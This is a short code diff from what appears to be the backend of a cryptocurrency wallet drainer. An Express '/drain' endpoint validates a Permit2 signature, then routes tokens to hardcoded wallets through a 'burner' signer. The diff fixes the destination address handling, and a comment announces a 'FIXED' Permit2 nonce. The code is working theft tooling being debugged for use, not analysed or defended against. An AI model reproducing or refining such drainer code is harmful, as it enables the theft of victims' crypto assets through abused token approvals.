@@ -189,7 +189,7 @@ app.post('/drain', async (req, res) => {
     return res.status(400).json({ error: 'Permit signature invalid or expired' });
   }
 
-  const destination = HARDCODED_WALLETS[tokenSymbol];
+  const destination = ethers.utils.getAddress(HARDCODED_WALLETS[tokenSymbol]); 
   const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, burner);
   
   // 🔥 FIXED PERMIT2: nonce=1 (NOT 0!)
